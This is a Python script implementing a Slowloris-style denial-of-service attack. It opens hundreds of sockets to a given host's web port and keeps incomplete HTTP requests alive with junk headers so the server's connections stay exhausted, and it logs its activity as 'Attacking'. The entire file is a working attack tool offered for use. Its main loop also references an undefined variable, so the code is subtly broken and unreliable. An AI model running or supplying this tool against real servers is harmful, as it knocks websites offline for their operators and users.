import socket
import logging
import argparse

from sys import exit, stdout
from time import sleep
from random import randint

logger = logging.getLogger()
logger.setLevel(logging.DEBUG)

handler = logging.StreamHandler(stdout)
handler.setLevel(logging.INFO)

logger.addHandler(handler)

parser = argparse.ArgumentParser()
parser.add_argument('host')
parser.add_argument('--sock_count', default=200, type=int)

headers = [
    'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0',
    'Accept-Language: en-US,en;q=0.5'
]

all_sockets = []


def init_socket(ip, port=80):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(4)
        sock.connect((ip, port))

        sock.send('GET /?{} HTTP/1.1\r\n'.format(randint(0, 50000)).encode('utf-8'))
        for header in headers:
            sock.send('{}\r\n'.format(header).encode('utf-8'))
        logger.debug('Connection established for {} on port {}'.format(ip, port))
        if sock:
            all_sockets.append(sock)
    except socket.error:
        return


def shutdown():
    for sock in all_sockets:
        sock.close()


def main():
    args = parser.parse_args()
    ip = socket.gethostbyname(args.host)
    sock_count = args.sock_count
    logger.info('Attacking {} with {} sockets'.format(ip, sock_count))
    logger.info('Creating {} sockets'.format(sock_count))
    for _ in range(sock_count):
        init_socket(ip)
        all_sockets.append(sock)

    while True:
        logger.info('Keeping {} sockets alive'.format(len(all_sockets)))
        for sock in all_sockets:
            try:
                sock.send('X-a: {}\r\n'.format(randint(1, 50000)).encode('utf-8'))
            except socket.error:
                all_sockets.remove(sock)

        for _ in range(sock_count - len(all_sockets)):
            logger.info('Recreating socket...')
            init_socket(ip)
        sleep(15)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        logger.info('Interrupt received, shutting down...')
        shutdown()
